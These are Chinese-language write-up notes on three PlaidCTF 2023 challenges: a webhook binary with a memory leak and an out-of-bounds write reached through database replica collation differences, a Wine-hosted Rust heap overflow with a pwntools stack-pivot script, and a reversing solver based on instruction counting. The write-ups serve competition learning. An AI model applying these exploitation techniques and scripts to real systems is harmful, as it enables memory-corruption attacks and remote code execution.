## Pwn

### Collector

> https://chovid99.github.io/posts/plaidctf-2023/

一共有以下服務：

- web - 網頁介面，使用 maindb (參考 `web/context/docker-entrypoint.sh`)
- webhook - 用於處理 hook 操作的 binary，使用 workerdb (參考 binary `main()` function)
- maindb - 主要儲存資料的 db
- workerdb - 做 database replication 的 replicator，除了透過 Dockerfile 以及檔案內容可以判斷出來，也能從 `workerdb/pre-docker-entrypoint.sh` 的命令知道
  - hostdb 則是 maindb

參考 schema file，可以知道 maindb 有以下 table：

- `hooks`
- `items`
- `market`
- `initial_inventory`
- `inventory`
- `users`
- `flag`
  - flag 會存放於此，也就代表最後會需要與 db 互動，並且從該 table 中取得 flag

web 服務提供了一些操作，透過這些操作我們能夠間接與 db 做互動，而比較重要的操作有：

- `watch` - 新增 `hooks` entry，欄位 `kind`, `url`, `secret` 都可控
- `unwatch` - 刪除 `hooks` entry
- `notify` - 將給定的 `kind` 寫到 `/queue/hook`，由 webhook 負責處理



hook binary：

```
webhook: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID[sha1]=d5d6d5be2abde8d43c7df25c83683a951754edf8, for GNU/Linux 3.7.0, not stripped

[*] '/docker_vol/plaidctf_2023/collector.11a0391b948dd4e2347c74be415e52743f3b0abcc3e3ffd571b046ded98f8d78/webhook/src/webhook'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- 作為一個 daemon，透過執行命令 `tail -n 0 -f /queue/hook` 等待 `/queue/hook` 的更新，並執行 hook 操作
- `perform_hooks()`
  1. 對應 kind 的 `hooks` entry 不能超過 10 個，否則無法執行
  2. 從 db limit 10 個 `hooks` entry 出來，並取出欄位 target 與 secret 的值



#### 漏洞1

```c
for (row = 0; ; row++)
{
    num_of_rows = PQntuples(res);
    if ( row >= num_of_rows )
    	break;
    
    field_len = PQgetlength(res, row, 0);
    target = malloc(field_len + 1); // [1]
    *&target_list[8 * row] = target;
    ptr = *&target_list[8 * row];
    target_field_res = PQgetvalue(res, row, 0LL);
    memcpy(ptr, target_field_res, field_len); // [2]
    secret_field_res = PQgetvalue(res, row, 1LL);
    secret = byteswap64(*secret_field_res);
    *&secret_list[8 * row] = secret;
}
```

- [1] 在分配記憶體給欄位 target 時，大小為資料長度 + 1
- [2] 複製資料時是用 `memcpy()` 而非 `strcpy()`，並且資料大小為資料長度

如果資料後面殘留 memory address，在後續 curl 時就會一起被帶出來，例如：

- target_url - `http://test/?x=_`
- 接收到時可能就會變成 `http://test/?x=_...\x64\x7f` 等



#### 漏洞 2

- 第一次檢查 hooks 的資料數時呼叫 `"SELECT count(kind) FROM hooks WHERE kind = $1"`，並將資料數存成 `hook_cnt`
- 第二次取得欄位 target、secret 時使用 `"SELECT target, secret FROM hooks WHERE kind = $1 ORDER BY target LIMIT 10"`，這邊直接最多取到 10，而不是使用先前取得的 `hook_cnt` (其實就算用還是會出事)

後續程式會呼叫 `alloca()` 在 stack 中動態分配記憶體，而分配的大小與 `hook_cnt` 有關，但是在儲存欄位資料時卻是使用第二次執行的結果，這會發生三個情況：

1. `hook_cnt` 等於第二次 query 的 entry 個數 - 沒事
2. 大於 - 分配更多的記憶體，並且後續會把 memory 的殘留資料當作 target pointer 與 secret data，作為 curl 的參數使用
3. 小於 - 分配較少的記憶體，target 跟 secret 會覆蓋到後面的記憶體，不過 curl 只會做 `hook_cnt` 次，因此不會 crash



#### 利用

大概分成三個步驟：

1. 透過漏洞1 leak address
2. 透過漏洞2 做 OOB write
3. 回彈 reverse shell



---

而接收 curl request 的 server 會影響到 `libcurl` 呼叫的 function，間接改變 heap 的結構，因此不同的 server 可能會產生**不同的 heap layout**，讓 exploit 無法生效。

透過測試，第一步驟能夠機率性的 leak libc 與 heap，並且觀察到 `malloc(n+1)` 會不斷使用同一塊 unsorted bin chunk，最後的步驟**直接參考原文內容**，我想這些步驟是不斷嘗試出來的結果：

- Create three accounts (user1, user2, user3)
- Call `watch(kind1)` with url length 0x4ff for user1
- Call `watch(kind1)` with url length 0x4ff for user2
- Call `watch(kind1)` with url length 0x43f for user3
- Call `watch(kind2)` with url length 0x7d7 for user1
- Call `watch(kind3)` with url length 0x7e8 for user1
  - We will call notify on this later to get a **libc** leak
- Call `watch(kind4)` with url length 0x800 for user1
  - We will call notify on this later to get a **heap** leak
- Call `notify(kind1)`
- Call `notify(kind2)`
- Call `notify(kind3)`
  - Our listening server will be hit with our input url + libc leak
- Call `notify(kind4)`
  - Our listening server will be hit with our input url + heap leak



---

而漏洞2實際上並非預期解，並且在遠端無法觸發，預期問題在於 workerdb 跟 maindb 的 Dockerfile 使用的 base image 不同，前者為 debian，後者則是 alpine。兩者雖然為 master-slave，但如果使用不同的 base image ，則可能會造成不同的 query 結果。而實際上會有兩個地方的處理不相同：

- locale - 做不同 encoding 之間的比較時，回傳的結果不相同，像是 'A' > 🐰 的情況一個會回傳 true，另一個則是 false (舉例，實際情況不一定如此)
- compare - 而在同個 encoding 中也有可能會發生回傳結果不同的問題
- DC 上有人提到是因為 glibc vs. ICU 的 `strcoll()` 實作不相同



# TODO

POC：

- Insert `1000` hooks with `kind=d`
- Insert `1000` hooks with `kind=E`
- Sleep for `1 minute` to wait for auto vacuum

vacuuming

- a maintenance task that helps to optimize database performance and reclaim space
- It involves removing deleted or outdated rows from tables and indexes and updating statistics used by the query planner
- https://isdaniel.github.io/postgresql-autovacuum/



而後 `notify(E)` 時，`workerdb` 會因為 "**unable to interpret the `index` correctly due to the differing results of the comparison**" 導致 `count()` query1 回傳 0 (`hook_cnt`) 而 query2 回傳 10 (target, secret)。





```
yeah, you corrupt indexes in replica
so that if one query uses sequential scan to find results and the other uses indexes, you may get different resutlts
```

```
im not sure if u can actually get it but i believe so
btw
i dont think its an index corruptio
the index is just transferred to replica
but replica interprets it differently with comparisons
so the index just doesnt make sense for replica
i think that's how it is? or am i getting it wrong lol
```

```
i dont think its an index corruption
the index is just transferred to replica
but replica interprets it differently with comparisons
so the index just doesnt make sense for replica
i think that's how it is? or am i getting it wrong lol
```

```
DO $$
DECLARE
    i INTEGER;
BEGIN
    FOR i IN 1..1000 LOOP
        INSERT INTO hooks (user_id, kind, target, secret) VALUES (1, 'd', 'http://127.0.0.1/' || ENCODE(gen_random_bytes(800), 'base64') || ENCODE(gen_random_bytes(1024), 'base64'), 4702111234474983745);
    END LOOP;
    
    FOR i IN 1..1000 LOOP
        INSERT INTO hooks (user_id, kind, target, secret) VALUES (1, 'E', 'http://127.0.0.2/' || ENCODE(gen_random_bytes(800), 'base64') || ENCODE(gen_random_bytes(1024), 'base64'), 4702111234474983745);
    END LOOP;
    
END $$;
VACUUM ANALYZE hooks;
```

https://www.postgresql.org/message-id/flat/BA6132ED-1F6B-4A0B-AC22-81278F5AB81E%40tripadvisor.com





### baby-heap-question-mark

Windows 的 Rust binary，並且跑在 Wine 上：

- 直接使用 `apt install wine` 安裝的版本是 "6.0.3~repack-1"

  - wine source code：https://github.com/wine-mirror/wine/archive/refs/tags/wine-6.0.3.tar.gz

- 整個安裝流程：
  ```bash
  mkdir build
  cd build
  ../configure --enable-debug --enable-win64
  ```

  - 如果 project 使用 `configure.ac` 以及 `Makefile.in`，需要透過 `autoreconf --install` 產生 `.configure`

Wine 一共有兩個 binary 會被直接執行：

- wine64

```
checksec
[-] Full RELRO
[+] No Canary found
[-] NX enabled
[+] No PIE
```

- wine64-preloader (真正執行 PE file 的程式)

```
checksec
[+] No RELRO
[-] Canary found
[-] NX enabled
[+] No PIE
```



---

> https://schlafwandler.github.io/posts/attacking-wine-part-i/

wine

- Wine (originally an acronym for "Wine Is Not an Emulator") is a compatibility layer capable of **running Windows applications** on several POSIX-compliant operating systems, such as Linux, macOS, & BSD
- Wine **emulates** the Windows runtime environment by translating **Windows system calls** into **POSIX-compliant system calls**, recreating the directory structure of Windows systems, and providing alternative implementations of Windows system libraries
- 單純在 application 跟 kernel 的 translation layer 作處理



隨便寫一個簡單的程式做測試，能發現 wine 的 executable / DLL / stack / heap 每次都會在同個位置，也就是 wine 包裝的環境中 binary 皆不受 ASLR 影響	

- 這邊指的 library 為 .dll，那些 .so 的檔案還是會受到影響

不過 dll 名稱的 .so 檔到底是什麼東西，這邊透過 ntdll.so 為例：

- `readelf -a ` 會看到許多 Windows function 的名稱，除此之外還是有一些 wine 自己的 function
- 從 source code (dlls/ntdll/unix/) 能知道還是 Unix 的實作，只是名稱相同而已

在 wine 中也可以執行 shellcode，配合 `VirtualAlloc()` 等記憶體分配與權限調整 API，wine 能把使用者的 data 複製到 rwx 記憶體區塊中執行，並且執行的 shellcode 能夠影響到 host 環境。

在 wine 的執行過程中，還可以在 target PE file 下斷點，因為 wine 做的事情只是處理 API 的 mapping，最後還是會去執行 target binary。

- 斷點在 allocate 位址 `0x140001B13` 取得 chunk address 以及相關參數
- 斷點在 write 位址 `0x140001908` 觀察 `memcpy()` 的情況，發現 input 大小不會做檢查就直接複製到 buffer 當中，有 raw heap overflow



接下來就是想辦法透過 heap overflow 控制到 RIP，而在測試 overflow 時能發現會一直斷在某個 mov 的 instruction，並且 register 的內容可控，猜測這個部分是 Windows heap 在更新 chunk linked list 時的操作，如果能找到 heap 上的 function table 或 pointer，搭配位址固定的 address，就可能可以控制到 RIP，但是在寫入時會發現兩個位址都需要可寫，因此只能控制 function table address。

- 在 `0x7bc57bdf` 會呼叫 `[[0x7bc7d048] + 0x50]`  指向的記憶體
- 配合 gadget `xchg eax, esp` ，能把 stack 遷到 victim，也就是 overflow 發生的 object



以下腳本做到 stack pivoting，剩下就是做 ROP：

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process(['./wine64', '../chal.exe'])

def alloc(size):
    r.sendlineafter("choice?", "1")
    r.sendlineafter("size?", str(size))

def drop(idx):
    r.sendlineafter("choice?", "2")
    r.sendlineafter("index?", str(idx))

def read(idx):
    r.sendlineafter("choice?", "3")
    r.sendlineafter("index?", str(idx))

def write(idx, data):
    r.sendlineafter("choice?", "4")
    r.sendlineafter("index?", str(idx))
    r.sendlineafter("data?", data)

# input buffer: 0x1cb20
cnt = 0x100
num = 100
cmd = """
b *0x140001908
"""
for _ in range(num):
    alloc(cnt)
for i in range(1, num):
    drop(i)

rop_xchg_eax_esp_ret = 0x7b033572
victim = 0x16450
objptr = 0x7bc7d048

gdb.attach(r, cmd)
payload = '11' * 0x50 + p64(rop_xchg_eax_esp_ret).hex() + '11' * (cnt - 0x58 + 0x10)
payload += p64(victim).hex() # rdx
payload += p64(objptr).hex() # rax

write(0, payload)
r.interactive()
```



---

> https://www.ctfiot.com/110554.html

- 直接蓋寫 node 結構，把 data pointer 改成指向 stack
- 直接在 stack 構造 ROP



## Rev

### Just the Check Please

當時的解題進度：

- Rust binary，參數透過 `argv[1]` 傳入，長度為 16
- 將 btree 的實作直接展開，並且會執行透過一些混淆的方法做 arith 運算
- 這些運算會被包裝成 btree 的操作，不過實際上還有些地方不確定在做什麼
- 執行到特定 opcode 時會檢查值，如果比對失敗的話就跳出

預期解法：

- 觀察**比對時的行為**，會發現 check value 跟 answer 只會相差一個 byte，可以推測每次只檢查一個 byte
- 透過 PinCTF (pintool wrapper) 或是 gdb script 觀察動態執行的行為，在比較的地方下斷點
- 由於能影響的 character 不會是依序 0-15，因此會需要每個 index 做測試，然後給定一個 printable char
- 用 breakpoint 踩到的次數判斷是不是有進步，如果踩到 bp 的次數變多，就代表猜中了

solver：

- 直觀的解題腳本可以參考：https://velog.io/@delom745/Plaid-CTF-2023-The-Check
- 我們隊伍的人也有寫出一個模擬退火演算法 (simulated-annealing) 的解法，概念是相近的，走越多 instruction 就代表越好，不過這個演算法不假設每個 character 是獨立的：

```python
import random
import string
import subprocess

# 執行 binary，參數 s 為 input
def get_proc(s):
    args = ['perf', 'stat', '-e', 'instructions', '-x',
            ',', '--no-big-num', '--', './check', s]
    proc = subprocess.Popen(args, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, encoding='utf-8')
    return proc

# 取得分數
def ret_score(proc):
    stdout, stderr = proc.communicate()
    if 'fail' in stdout:
        return int(stderr.split(',')[0])
    return 1e18

# 更新 input
# s - flag
# x - 個數
def change(s, x):
    t = s[::]
	# 從 0 - 15 隨機選 x 個 idx，置換成新的
    idx = random.sample([*range(16)], x)
    for i in idx:
        t[i] = random.choice(string.printable)
    return ''.join(t)

# current: 當前 flag
def iteration(dis, best, current, cnt):
    # 共 25 rounds
    for it in range(0, cnt, 16):
        procs = []
        # 從 16 個 idx 中，取得
        for _ in range(16):
            tmp = change(current, dis)
            procs.append((get_proc(tmp), tmp))
        for proc, tmp in procs:
            score = ret_score(proc)
            if score > best:
                # 如果走得更深，那就回傳當前分數以及 flag
                print(score, dis, repr(tmp))
                return score, list(tmp)
    return best, None

best = 0
current = list('?' * 16)
while best < 1e18:
    dis = 12
    while dis > 0:
        best, nxt = iteration(dis, best, current, 400)
        if nxt is not None:
            # 更新 flag
            current = nxt
        else:
            # 選少一點
            dis -= 1

print('key =', repr(''.join(current)))
```



此外，當初在解題時其實也有觀察到比較只跟一個 char 有關的情況，但是我們假設 char 被替換掉後，**用來比較的值一定會更新**，但實際上看起來不一定，只有在猜對的時候會走得更深，因此基於該假設而優化的腳本沒辦法成功解開。 
